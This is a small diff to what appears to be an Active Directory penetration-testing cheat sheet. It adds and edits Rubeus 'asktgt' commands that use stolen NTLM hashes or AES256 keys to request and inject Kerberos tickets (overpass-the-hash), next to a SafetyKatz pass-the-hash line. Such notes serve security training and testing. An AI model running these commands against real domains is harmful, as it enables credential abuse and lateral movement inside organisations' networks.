@@ -128,11 +128,12 @@ SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS>
 - Below doesn't need elevation
 ```
 Rubeus.exe asktgt /user:<USER> /rc4:<NTLM HASH> /domain /nowrap /ptt
+Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /ptt
 ```
 
 - Below command needs elevation
 ```
-Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Rubeus.exe asktgt /user:<USER> /aes256:<AES256KEYS> /domain /opsec /nowrap /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 ### Double hop
